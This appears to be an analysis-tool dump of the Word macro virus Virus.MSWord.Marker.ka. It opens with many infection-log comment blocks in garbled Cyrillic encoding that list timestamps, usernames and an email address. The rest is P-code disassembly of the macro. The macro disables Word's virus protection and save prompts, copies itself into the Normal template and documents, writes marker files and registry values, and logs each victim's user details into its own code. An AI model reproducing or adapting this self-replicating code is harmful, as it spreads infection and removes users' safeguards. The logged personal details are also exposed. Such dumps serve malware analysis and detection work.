' 09:49:42 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:14:22 - ÷åòâåðã, 5 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:09:44 - âîñêðåñåíüå, 8 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:14:18 - âîñêðåñåíüå, 8 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:01:32 - âîñêðåñåíüå, 8 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:01:55 - âîñêðåñåíüå, 8 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:38:59 - âîñêðåñåíüå, 8 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:09:26 - ïîíåäåëüíèê, 9 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:07:33 - ïîíåäåëüíèê, 9 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:16:47 - âîñêðåñåíüå, 22 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:37:01 - âîñêðåñåíüå, 22 àïð 2001
' Ðàõìåòîâ Ìàðàò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:27:14 - ïÿòíèöà, 27 àïð 2001
' ÍÊ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:32:49 - ÷åòâåðã, 3 ìàé 2001
' ÍÊ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:24:13 - ñóááîòà, 19 ìàé 2001
' Orgotdel
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:45:51 - ïîíåäåëüíèê, 21 ìàé 2001
' post
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:31:59 - ïîíåäåëüíèê, 21 ìàé 2001
' post
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:43:31 - ïîíåäåëüíèê, 21 ìàé 2001
' post
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:21:07 - ñðåäà, 23 ìàé 2001
' post
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:17:00 - ñðåäà, 23 ìàé 2001
' host
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:52:42 - ÷åòâåðã, 24 ìàé 2001
' host
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:42:41 - ïÿòíèöà, 25 ìàé 2001
' orb1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:03:26 - ïÿòíèöà, 25 ìàé 2001
' Gulnara
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:28:03 - ïîíåäåëüíèê, 28 ìàé 2001
' Gulnara
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:33:05 - âòîðíèê, 29 ìàé 2001
' Gulnara
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:31:46 - ñðåäà, 30 ìàé 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:46:38 - ÷åòâåðã, 31 ìàé 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:15:46 - ïÿòíèöà, 1 èþí 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:46:56 - ïîíåäåëüíèê, 4 èþí 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:34:05 - âòîðíèê, 5 èþí 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:27:38 - ïîíåäåëüíèê, 18 èþí 2001
' Ice
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:10:21 - âîñêðåñåíüå, 24 èþí 2001
' St_p2
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:26:54 - ÷åòâåðã, 28 èþí 2001
' St_p2
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:12:04 - ÷åòâåðã, 28 èþí 2001
' St_p2
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:46:30 - ïîíåäåëüíèê, 2 èþë 2001
' St_p2
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:54:08 - ïîíåäåëüíèê, 9 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:22 - ïîíåäåëüíèê, 9 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:06:17 - ïîíåäåëüíèê, 9 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:06:55 - ñðåäà, 11 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:41 - ïÿòíèöà, 13 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:58:06 - ñóááîòà, 14 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:48:50 - ñóááîòà, 14 èþë 2001
' st_p7
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:08:50 - ïîíåäåëüíèê, 23 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:22:15 - ïîíåäåëüíèê, 23 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:24:01 - ïîíåäåëüíèê, 23 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:44:58 - ïîíåäåëüíèê, 30 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:29:59 - ïîíåäåëüíèê, 30 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:22:43 - ïîíåäåëüíèê, 30 èþë 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:21:57 - ÷åòâåðã, 2 àâã 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:36 - âòîðíèê, 7 àâã 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:55:32 - ïîíåäåëüíèê, 13 àâã 2001
' Áîæêî Ë.Ë.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:00:34 - ïîíåä³ëîê, 20 Ñåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:39:59 - ñåðåäà, 22 Ñåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:52:51 - ï'ÿòíèöÿ, 7 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:23:14 - ï'ÿòíèöÿ, 14 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:42:33 - ïîíåä³ëîê, 17 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:02:24 - ïîíåä³ëîê, 17 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:06:34 - ÷åòâåð, 20 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:25:06 - ïîíåä³ëîê, 24 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:25:43 - ïîíåä³ëîê, 24 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:23:32 - ï'ÿòíèöÿ, 28 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:24:11 - ï'ÿòíèöÿ, 28 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:24:52 - ï'ÿòíèöÿ, 28 Âåð 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:00:40 - ïîíåä³ëîê, 1 Æîâ 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:34:11 - â³âòîðîê, 2 Æîâ 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:46:17 - ñåðåäà, 3 Æîâ 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:05:46 - â³âòîðîê, 9 Æîâ 2001
' Ìèõåðñêàÿ Í.À.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:41:37 - ïÿòíèöà, 12 îêò 2001
' NSmirnova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:20:04 - ïÿòíèöà, 12 îêò 2001
' NSmirnova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:20:10 - ïÿòíèöà, 12 îêò 2001
' NSmirnova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:00:58 - ïÿòíèöà, 12 îêò 2001
' NSmirnova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:23:49 - ïÿòíèöà, 12 îêò 2001
' NSmirnova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:57:57 - ñðåäà, 21 íîÿ 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:09:37 - ñðåäà, 28 íîÿ 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:52:42 - ïÿòíèöà, 7 äåê 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:35:30 - ïîíåäåëüíèê, 10 äåê 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:35:56 - ïîíåäåëüíèê, 10 äåê 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:46:50 - ÷åòâåðã, 13 äåê 2001
' Êèñëåíêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:08:22 - âòîðíèê, 18 äåê 2001
' Êèñëåíêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:08:17 - âîñêðåñåíüå, 23 äåê 2001
' fayer
' aku@tanak-cakap.com



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:32:16 - Tuesday, 27 Aug 2002
' • Ian Ace Culallad •
' IFONTOC



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ka
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 74688 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld UserForm1 
' 	ArgsMemCall Show 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #4:
' 	LitStr 0x0001 "a"
' 	Ld ListBox1 
' 	MemSt Text1 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #8:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #9:
' 	FuncDefn (Private Sub Document_Close())
' Line #10:
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #14:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #15:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #16:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #17:
' Line #18:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #21:
' Line #22:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #23:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #24:
' Line #25:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' Line #30:
' Line #31:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' Line #33:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #40:
' Line #41:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #42:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #43:
' Line #44:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #47:
' Line #48:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #58:
' Line #59:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #60:
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' Line #64:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #65:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #66:
' Line #67:
' Line #68:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #69:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #70:
' Line #71:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #72:
' Line #73:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #74:
' Line #75:
' Line #76:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #78:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	ElseBlock 
' Line #83:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' Line #87:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
